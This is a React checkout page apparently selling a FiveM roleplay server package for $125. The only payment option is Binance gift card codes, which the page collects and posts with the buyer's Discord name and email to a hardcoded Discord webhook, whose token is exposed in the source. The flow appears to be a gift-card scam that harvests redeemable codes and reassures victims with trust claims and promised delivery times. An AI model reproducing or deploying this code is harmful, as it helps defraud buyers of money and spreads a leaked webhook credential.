import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  ArrowLeft, ArrowRight, Check, CreditCard, Gift, Upload,
  ExternalLink, ShieldCheck, Clock, Send, Loader2, AlertCircle,
  CheckCircle2, XCircle,
} from "lucide-react";
import { Link } from "react-router-dom";
import heroBg from "@/assets/hero-bg.png";

// ─── PASTE YOUR DISCORD WEBHOOK URL HERE ─────────────────────────────────────
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1486980111667429406/XTCuD4A7clYwioRQiChnhhTILjam5SoIa_mehd3LIaZjXeqrEULpNvykTD8qNHNoDlD2";
// ─────────────────────────────────────────────────────────────────────────────

const STEPS = ["Product Summary", "Payment Method", "Complete Order"];

const features = [
  "Sleek & Professional UI",
  "Advanced Illegal System",
  "Integrated Police Dispatch",
  "Realistic Graphics",
  "Optimized Performance (0.8ms res)",
  "Multiplayer Jobs",
  "Plug-and-Play Ready",
  "Premium Clothing Pack",
  "300+ Custom Unbranded Cars",
];

const included = [
  { icon: "🎁", text: "Free Support" },
  { icon: "🔄", text: "Free Monthly Updates" },
  { icon: "⚡", text: "Complete Setup" },
];

const helpfulLinks = [
  { name: "ENABA", url: "https://www.eneba.com/binance-binance-gift-card-usdt-125-usd-key-global?srsltid=AfmBOoqi7VjgmjwnrQummOR2rMDjH8BU_0Q9o0xNwMBm3OgIrY3oaSKC" },
  { name: "DRIFFLE", url: "https://driffle.com/binance-usdt-125-usd-gift-card-global-digital-key-p9925373" },
  { name: "G2A", url: "https://www.g2a.com/fr/binance-gift-card-125-usdt-key-i10000301475060" },
  { name: "KINGUIN", url: "https://www.kinguin.net/category/158515/binance-gift-card-usdt-125" },
];

const slideVariants = {
  enter: (dir: number) => ({ x: dir > 0 ? 80 : -80, opacity: 0 }),
  center: { x: 0, opacity: 1 },
  exit: (dir: number) => ({ x: dir > 0 ? -80 : 80, opacity: 0 }),
};

// ─── Binance Gift Card Format Validator ───────────────────────────────────────
//
// Binance gift card codes follow this format:
//   - Exactly 16 uppercase alphanumeric characters
//   - Only letters A-Z and digits 0-9 (no special chars, no spaces)
//   - Example: 2MQ0EFFFEE98OQDK
//
// Catches: wrong length, lowercase, spaces, dashes, special characters,
// obviously invalid input like URLs, sentences, or random keyboard mashing.

const BINANCE_CODE_REGEX = /^[A-Z0-9]{16}$/;

interface CodeValidationResult {
  valid: boolean;
  error?: string;
  failedLine?: number;
}

function validateGiftCardCodes(raw: string): CodeValidationResult {
  const lines = raw
    .split("\n")
    .map((l) => l.trim().toUpperCase().replace(/[-\s]/g, ""))
    .filter((l) => l.length > 0);

  if (lines.length === 0) {
    return { valid: false, error: "Please enter at least one gift card code." };
  }

  for (let i = 0; i < lines.length; i++) {
    const code = lines[i];

    if (code.length !== 16) {
      return {
        valid: false,
        failedLine: i + 1,
        error: lines.length > 1
          ? `Code on line ${i + 1} is invalid — must be exactly 16 characters (got ${code.length}).`
          : `Invalid code length — Binance codes are exactly 16 characters (you entered ${code.length}).`,
      };
    }

    if (!BINANCE_CODE_REGEX.test(code)) {
      return {
        valid: false,
        failedLine: i + 1,
        error: lines.length > 1
          ? `Code on line ${i + 1} has invalid characters — only uppercase letters (A–Z) and numbers (0–9) are allowed.`
          : "Invalid characters — Binance codes only contain uppercase letters (A–Z) and numbers (0–9).",
      };
    }
  }

  return { valid: true };
}

// ─── General Form Validation ──────────────────────────────────────────────────

function validateOrder(discord: string, email: string, giftCodes: string): string | null {
  if (!discord.trim() || discord.trim().length < 2) {
    return "Please enter your Discord username.";
  }
  if (email.trim().length > 0) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email.trim())) {
      return "Please enter a valid email address.";
    }
  }
  const codeCheck = validateGiftCardCodes(giftCodes);
  if (!codeCheck.valid) return codeCheck.error!;
  return null;
}

// ─── Code Status ──────────────────────────────────────────────────────────────

type CodeStatus = "idle" | "valid" | "invalid";

function getCodeStatus(raw: string): CodeStatus {
  if (!raw.trim()) return "idle";
  return validateGiftCardCodes(raw).valid ? "valid" : "invalid";
}

// ─── Main Component ───────────────────────────────────────────────────────────

const Checkout = () => {
  const [step, setStep] = useState(0);
  const [direction, setDirection] = useState(1);
  const [discord, setDiscord] = useState("");
  const [email, setEmail] = useState("");
  const [giftCodes, setGiftCodes] = useState("");
  const [file, setFile] = useState<File | null>(null);

  const [submitting, setSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [submitted, setSubmitted] = useState(false);

  const next = () => { setDirection(1); setStep((s) => Math.min(s + 1, 2)); };
  const back = () => { setDirection(-1); setStep((s) => Math.max(s - 1, 0)); };

  const handleSubmit = async () => {
    setSubmitError(null);

    const validationError = validateOrder(discord, email, giftCodes);
    if (validationError) {
      setSubmitError(validationError);
      return;
    }

    setSubmitting(true);

    try {
      const now = new Date();
      const formattedDate = now.toLocaleString("en-GB", {
        day: "2-digit", month: "2-digit", year: "numeric",
        hour: "2-digit", minute: "2-digit", second: "2-digit",
      });

      // Normalize: clean, uppercase, dedupe blank lines
      const normalizedCodes = giftCodes
        .split("\n")
        .map((l) => l.trim().toUpperCase().replace(/[-\s]/g, ""))
        .filter((l) => l.length > 0)
        .join("\n");

      const res = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [
            {
              title: "🛒 New Order Submitted",
              color: 0x00bcd4,
              fields: [
                { name: "👤 Discord Username", value: discord.trim(), inline: true },
                { name: "📧 Email", value: email.trim() || "_Not provided_", inline: true },
                { name: "🎁 Gift Card Code(s)", value: "```\n" + normalizedCodes + "\n```", inline: false },
                { name: "✅ Format Validated", value: "Passed (16-char alphanumeric)", inline: true },
                { name: "📎 Proof / Screenshot", value: file?.name || "_Not uploaded_", inline: true },
                { name: "🕐 Submitted At", value: formattedDate, inline: false },
              ],
              footer: { text: "Brinley Server – Checkout System" },
              timestamp: now.toISOString(),
            },
          ],
        }),
      });

      if (!res.ok) throw new Error("Webhook delivery failed");
      setSubmitted(true);
    } catch {
      setSubmitError("Failed to submit your order. Please try again or contact support.");
    } finally {
      setSubmitting(false);
    }
  };

  // ─── Success screen ────────────────────────────────────────────────────────
  if (submitted) {
    return (
      <div className="min-h-screen bg-background relative overflow-hidden flex items-center justify-center">
        <div className="absolute inset-0">
          <img src={heroBg} alt="" className="w-full h-full object-cover opacity-[0.06]" />
          <div className="absolute inset-0 bg-gradient-to-b from-background/60 via-background/95 to-background" />
        </div>
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.4 }}
          className="relative z-10 max-w-md mx-auto px-4 text-center"
        >
          <div className="w-16 h-16 rounded-full bg-emerald-400/15 border border-emerald-400/30 flex items-center justify-center mx-auto mb-6">
            <CheckCircle2 className="w-8 h-8 text-emerald-400" />
          </div>
          <h2 className="font-display text-2xl font-bold text-foreground mb-3">Order Submitted!</h2>
          <p className="text-muted-foreground text-sm mb-2">
            We've received your gift card code and will validate it shortly.
          </p>
          <p className="text-muted-foreground text-sm mb-8">
            Your server will be delivered within{" "}
            <span className="text-foreground font-medium">5 minutes – 1 hour</span>.
          </p>
          <Link
            to="/"
            className="inline-flex items-center gap-2 px-6 py-3 rounded-xl bg-primary text-primary-foreground font-heading font-semibold text-sm hover:brightness-110 transition-all glow-cyan-sm"
          >
            <ArrowLeft className="w-4 h-4" /> Back to Home
          </Link>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background relative overflow-hidden">
      <div className="absolute inset-0">
        <img src={heroBg} alt="" className="w-full h-full object-cover opacity-[0.06]" />
        <div className="absolute inset-0 bg-gradient-to-b from-background/60 via-background/95 to-background" />
      </div>
      <div className="absolute inset-0 opacity-[0.02]" style={{
        backgroundImage: "linear-gradient(hsl(var(--primary)) 1px, transparent 1px), linear-gradient(90deg, hsl(var(--primary)) 1px, transparent 1px)",
        backgroundSize: "60px 60px",
      }} />

      <div className="relative z-10 max-w-3xl mx-auto px-4 py-10 md:py-16">
        <Link to="/" className="inline-flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm mb-8">
          <ArrowLeft className="w-4 h-4" /> Back to Home
        </Link>

        {/* Step indicator */}
        <div className="flex items-center justify-center gap-2 mb-10">
          {STEPS.map((label, i) => (
            <div key={i} className="flex items-center gap-2">
              <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-heading font-semibold tracking-wide transition-all duration-300 ${
                i === step ? "bg-primary/15 text-primary border border-primary/30"
                : i < step ? "bg-primary/10 text-primary/70 border border-primary/20"
                : "bg-card/40 text-muted-foreground border border-border/40"
              }`}>
                {i < step ? <Check className="w-3.5 h-3.5" /> : <span>{i + 1}</span>}
                <span className="hidden sm:inline">{label}</span>
              </div>
              {i < STEPS.length - 1 && (
                <div className={`w-8 h-px transition-colors duration-300 ${i < step ? "bg-primary/50" : "bg-border/40"}`} />
              )}
            </div>
          ))}
        </div>

        {/* Step content */}
        <AnimatePresence mode="wait" custom={direction}>
          <motion.div
            key={step}
            custom={direction}
            variants={slideVariants}
            initial="enter"
            animate="center"
            exit="exit"
            transition={{ duration: 0.3, ease: "easeInOut" }}
          >
            {step === 0 && <StepOne onNext={next} />}
            {step === 1 && <StepTwo onNext={next} onBack={back} />}
            {step === 2 && (
              <StepThree
                discord={discord} setDiscord={setDiscord}
                email={email} setEmail={setEmail}
                giftCodes={giftCodes} setGiftCodes={setGiftCodes}
                file={file} setFile={setFile}
                onBack={back}
                onSubmit={handleSubmit}
                submitting={submitting}
                submitError={submitError}
              />
            )}
          </motion.div>
        </AnimatePresence>
      </div>
    </div>
  );
};

/* ─── STEP 1 ─── */
const StepOne = ({ onNext }: { onNext: () => void }) => (
  <div className="space-y-6">
    <div className="rounded-2xl border border-border/50 bg-card/50 backdrop-blur-xl p-6 md:p-8">
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-6">
        <div>
          <p className="text-xs text-primary font-heading font-semibold tracking-widest uppercase mb-1">FiveM Package</p>
          <h1 className="font-display text-xl md:text-2xl font-bold text-foreground">BRINLEY SERVER V5 – QBCore</h1>
        </div>
        <div className="text-3xl font-display font-black text-foreground">$125</div>
      </div>

      <div className="mb-6">
        <h3 className="text-sm font-heading font-semibold text-foreground mb-3 flex items-center gap-2">
          <ShieldCheck className="w-4 h-4 text-primary" /> Why Choose Brinley Server
        </h3>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
          {features.map((f) => (
            <div key={f} className="flex items-center gap-2.5 text-sm text-muted-foreground">
              <Check className="w-4 h-4 text-emerald-400 shrink-0" />{f}
            </div>
          ))}
        </div>
      </div>

      <div className="border-t border-border/40 pt-5">
        <h3 className="text-sm font-heading font-semibold text-foreground mb-3">What's Included When You Buy Our Server?</h3>
        <div className="flex flex-wrap gap-4">
          {included.map((item) => (
            <div key={item.text} className="flex items-center gap-2 text-sm text-muted-foreground">
              <span className="text-base">{item.icon}</span>{item.text}
            </div>
          ))}
        </div>
      </div>
    </div>

    <button onClick={onNext} className="w-full flex items-center justify-center gap-2 px-6 py-3.5 rounded-xl bg-primary text-primary-foreground font-heading font-semibold text-sm hover:brightness-110 transition-all glow-cyan-sm">
      Continue to Payment <ArrowRight className="w-4 h-4" />
    </button>
  </div>
);

/* ─── STEP 2 ─── */
const StepTwo = ({ onNext, onBack }: { onNext: () => void; onBack: () => void }) => (
  <div className="space-y-6">
    <div className="rounded-2xl border border-border/50 bg-card/50 backdrop-blur-xl p-6 md:p-8">
      <h2 className="font-display text-xl font-bold text-foreground mb-2">Choose Payment Method</h2>
      <p className="text-sm text-muted-foreground mb-6">Select how you'd like to pay for your server package.</p>

      <button onClick={onNext} className="w-full flex items-center gap-4 p-4 rounded-xl border-2 border-primary/40 bg-primary/5 hover:bg-primary/10 transition-all group">
        <div className="w-12 h-12 rounded-xl bg-primary/15 flex items-center justify-center shrink-0">
          <Gift className="w-5 h-5 text-primary" />
        </div>
        <div className="text-left flex-1">
          <p className="font-heading font-semibold text-foreground text-sm">Binance Gift Card</p>
          <p className="text-xs text-muted-foreground">Pay with Binance Gift Card (USD) — manual validation</p>
        </div>
        <div className="px-2.5 py-1 rounded-md bg-primary/15 text-primary text-xs font-heading font-semibold">Available</div>
      </button>

      <div className="mt-3 flex items-center gap-4 p-4 rounded-xl border border-border/40 bg-card/30 opacity-50 cursor-not-allowed">
        <div className="w-12 h-12 rounded-xl bg-muted/50 flex items-center justify-center shrink-0">
          <CreditCard className="w-5 h-5 text-muted-foreground" />
        </div>
        <div className="text-left flex-1">
          <p className="font-heading font-semibold text-muted-foreground text-sm">Credit/Debit Card</p>
          <p className="text-xs text-muted-foreground">Coming soon</p>
        </div>
        <div className="px-2.5 py-1 rounded-md bg-muted/30 text-muted-foreground text-xs font-heading font-semibold">Soon</div>
      </div>
    </div>

    <div className="flex gap-3">
      <button onClick={onBack} className="flex-1 flex items-center justify-center gap-2 px-6 py-3.5 rounded-xl border border-border/50 text-foreground font-heading font-semibold text-sm hover:bg-card/40 transition-all">
        <ArrowLeft className="w-4 h-4" /> Back
      </button>
      <button onClick={onNext} className="flex-1 flex items-center justify-center gap-2 px-6 py-3.5 rounded-xl bg-primary text-primary-foreground font-heading font-semibold text-sm hover:brightness-110 transition-all glow-cyan-sm">
        Continue <ArrowRight className="w-4 h-4" />
      </button>
    </div>
  </div>
);

/* ─── STEP 3 ─── */
interface StepThreeProps {
  discord: string; setDiscord: (v: string) => void;
  email: string; setEmail: (v: string) => void;
  giftCodes: string; setGiftCodes: (v: string) => void;
  file: File | null; setFile: (v: File | null) => void;
  onBack: () => void;
  onSubmit: () => void;
  submitting: boolean;
  submitError: string | null;
}

const StepThree = ({
  discord, setDiscord, email, setEmail,
  giftCodes, setGiftCodes, file, setFile,
  onBack, onSubmit, submitting, submitError,
}: StepThreeProps) => {
  const codeStatus: CodeStatus = getCodeStatus(giftCodes);
  const codeValidation = giftCodes.trim() ? validateGiftCardCodes(giftCodes) : null;

  return (
    <div className="space-y-6">
      <div className="rounded-2xl border border-border/50 bg-card/50 backdrop-blur-xl p-6 md:p-8">
        <h2 className="font-display text-xl font-bold text-foreground mb-2">Payment via Binance Gift Card</h2>
        <p className="text-sm text-muted-foreground mb-6">Complete the form below to submit your order.</p>

        {/* Info box */}
        <div className="rounded-xl bg-primary/5 border border-primary/20 p-4 mb-6 space-y-1.5 text-sm text-muted-foreground">
          <p>✅ We accept <span className="text-foreground font-medium">Binance Gift Card Global (USD only)</span></p>
          <p>❌ EUR is <span className="text-foreground font-medium">not supported</span></p>
          <p>💰 Minimum value: <span className="text-foreground font-medium">$125</span></p>
          <p>🔗 You may combine multiple gift cards</p>
        </div>

        {/* How to purchase */}
        <div className="mb-6 rounded-xl border border-primary/20 bg-primary/5 p-5 space-y-4">
          <h3 className="text-sm font-heading font-semibold text-foreground flex items-center gap-2">
            🏪 How to Purchase (G2A Gift Card)
          </h3>
          <div className="space-y-3">
            {[
              <>Go to this website and buy the gift card:{" "}
                <a href="https://www.g2a.com/fr/binance-gift-card-125-usdt-key-i10000301475060" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline inline-flex items-center gap-1">
                  g2a.com/binance-gift-card <ExternalLink className="w-3 h-3" />
                </a></>,
              <>After the purchase, you will receive a <span className="text-foreground font-medium">gift card code</span> 🎁</>,
              <>Send me the gift card code, and I'll proceed immediately with your order 🚀</>,
            ].map((content, i) => (
              <div key={i} className="flex items-start gap-3">
                <span className="flex items-center justify-center w-6 h-6 rounded-md bg-primary/20 text-primary text-xs font-bold shrink-0">{i + 1}</span>
                <p className="text-sm text-muted-foreground">{content}</p>
              </div>
            ))}
          </div>

          <div className="pt-3 border-t border-primary/10">
            <p className="text-sm text-muted-foreground mb-1">🎬 <span className="font-medium text-foreground">Video Tutorial:</span></p>
            <p className="text-sm text-muted-foreground">
              If you need help, follow this step-by-step guide:{" "}
              <a href="https://www.youtube.com/watch?v=t5tM0eHnXpA" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline inline-flex items-center gap-1">
                Watch Tutorial <ExternalLink className="w-3 h-3" />
              </a>
            </p>
          </div>

          <div className="pt-3 border-t border-primary/10">
            <p className="text-sm text-muted-foreground">
              💎 <span className="font-medium text-foreground">Alternative option:</span> If you have{" "}
              <span className="font-medium text-foreground">Binance or Coinbase</span>, we can also proceed with{" "}
              <span className="font-medium text-foreground">direct crypto payment (USDT)</span> — no gift card needed ✨
            </p>
          </div>

          <div className="flex items-center gap-2 pt-2 text-sm text-muted-foreground">
            <ShieldCheck className="w-4 h-4 text-emerald-400" />
            Safe & trusted payment methods used by other customers with no issues ✅
          </div>
        </div>

        {/* Where to buy */}
        <div className="mb-6">
          <p className="text-xs text-muted-foreground mb-2 font-heading font-semibold uppercase tracking-wider">Where to buy Binance Gift Cards</p>
          <div className="flex flex-wrap gap-2">
            {helpfulLinks.map((link) => (
              <a key={link.name} href={link.url} target="_blank" rel="noopener noreferrer"
                className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-border/50 bg-card/40 text-xs text-muted-foreground hover:text-primary hover:border-primary/30 transition-all">
                <ExternalLink className="w-3 h-3" /> {link.name}
              </a>
            ))}
          </div>
        </div>

        {/* Form */}
        <div className="space-y-4">
          {/* Discord */}
          <div>
            <label className="block text-xs font-heading font-semibold text-foreground mb-1.5">
              Discord Username <span className="text-primary">*</span>
            </label>
            <input
              value={discord}
              onChange={(e) => setDiscord(e.target.value)}
              placeholder="e.g. brinley#0001"
              disabled={submitting}
              className="w-full px-4 py-3 rounded-xl bg-background/60 border border-border/50 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-1 focus:ring-primary/30 transition-all disabled:opacity-50"
            />
          </div>

          {/* Email */}
          <div>
            <label className="block text-xs font-heading font-semibold text-foreground mb-1.5">
              Email <span className="text-muted-foreground font-normal">(for delivery)</span>
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="you@email.com"
              disabled={submitting}
              className="w-full px-4 py-3 rounded-xl bg-background/60 border border-border/50 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-1 focus:ring-primary/30 transition-all disabled:opacity-50"
            />
          </div>

          {/* Gift card code with live validation */}
          <div>
            <label className="block text-xs font-heading font-semibold text-foreground mb-1.5">
              Binance Gift Card Code(s) <span className="text-primary">*</span>
            </label>
            <p className="text-xs text-muted-foreground mb-2">
              Must be <span className="text-foreground font-medium">exactly 16 characters</span>, uppercase letters &amp; numbers only (e.g. <span className="font-mono text-foreground">2MQ0EFFFEE98OQDK</span>).
              One code per line if using multiple.
            </p>

            <div className="relative">
              <textarea
                value={giftCodes}
                onChange={(e) => setGiftCodes(e.target.value)}
                placeholder="e.g. 2MQ0EFFFEE98OQDK"
                rows={3}
                disabled={submitting}
                className={`w-full px-4 py-3 pr-10 rounded-xl bg-background/60 border text-sm text-foreground placeholder:text-muted-foreground focus:outline-none transition-all resize-none disabled:opacity-50 font-mono tracking-wider
                  ${codeStatus === "valid"
                    ? "border-emerald-400/60 focus:border-emerald-400 focus:ring-1 focus:ring-emerald-400/30"
                    : codeStatus === "invalid"
                    ? "border-red-400/60 focus:border-red-400 focus:ring-1 focus:ring-red-400/30"
                    : "border-border/50 focus:border-primary/50 focus:ring-1 focus:ring-primary/30"
                  }`}
              />
              {/* Status icon top-right */}
              {codeStatus !== "idle" && (
                <div className="absolute top-3 right-3 pointer-events-none">
                  {codeStatus === "valid"
                    ? <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                    : <XCircle className="w-4 h-4 text-red-400" />
                  }
                </div>
              )}
            </div>

            {/* Live feedback below textarea */}
            <AnimatePresence mode="wait">
              {codeStatus === "valid" && (
                <motion.p
                  key="valid"
                  initial={{ opacity: 0, y: -4 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0 }}
                  className="mt-1.5 text-xs text-emerald-400 flex items-center gap-1.5"
                >
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  Code format looks correct ✓
                </motion.p>
              )}
              {codeStatus === "invalid" && codeValidation && (
                <motion.p
                  key="invalid"
                  initial={{ opacity: 0, y: -4 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0 }}
                  className="mt-1.5 text-xs text-red-400 flex items-center gap-1.5"
                >
                  <XCircle className="w-3.5 h-3.5 shrink-0" />
                  {codeValidation.error}
                </motion.p>
              )}
            </AnimatePresence>
          </div>

          {/* Proof upload */}
          <div>
            <label className="block text-xs font-heading font-semibold text-foreground mb-1.5">
              Proof / Screenshot <span className="text-muted-foreground font-normal">(optional)</span>
            </label>
            <label className={`flex items-center justify-center gap-2 w-full px-4 py-4 rounded-xl border-2 border-dashed border-border/50 bg-background/40 text-sm text-muted-foreground hover:border-primary/30 hover:bg-primary/5 transition-all ${submitting ? "cursor-not-allowed opacity-50" : "cursor-pointer"}`}>
              <Upload className="w-4 h-4" />
              {file ? file.name : "Click to upload a file"}
              <input type="file" className="hidden" disabled={submitting} onChange={(e) => setFile(e.target.files?.[0] || null)} />
            </label>
          </div>
        </div>

        {/* Submit error */}
        {submitError && (
          <motion.div
            initial={{ opacity: 0, y: -8 }}
            animate={{ opacity: 1, y: 0 }}
            className="flex items-center gap-2.5 mt-5 p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 text-red-400 text-sm"
          >
            <AlertCircle className="w-4 h-4 shrink-0" />
            {submitError}
          </motion.div>
        )}

        {/* Processing notice */}
        <div className="flex items-start gap-2.5 mt-6 p-3 rounded-xl bg-muted/30 border border-border/30">
          <Clock className="w-4 h-4 text-primary shrink-0 mt-0.5" />
          <p className="text-xs text-muted-foreground">
            Orders via Gift Card can take <span className="text-foreground font-medium">5 minutes – 1 hour</span> to be validated and released.
          </p>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={onBack}
          disabled={submitting}
          className="flex-1 flex items-center justify-center gap-2 px-6 py-3.5 rounded-xl border border-border/50 text-foreground font-heading font-semibold text-sm hover:bg-card/40 transition-all disabled:opacity-50"
        >
          <ArrowLeft className="w-4 h-4" /> Back
        </button>
        <button
          onClick={onSubmit}
          disabled={submitting || codeStatus === "invalid"}
          className="flex-1 flex items-center justify-center gap-2 px-6 py-3.5 rounded-xl bg-primary text-primary-foreground font-heading font-semibold text-sm hover:brightness-110 transition-all glow-cyan-sm disabled:opacity-70 disabled:cursor-not-allowed"
        >
          {submitting
            ? <><Loader2 className="w-4 h-4 animate-spin" /> Submitting…</>
            : <><Send className="w-4 h-4" /> Submit Order</>
          }
        </button>
      </div>
    </div>
  );
};

export default Checkout;
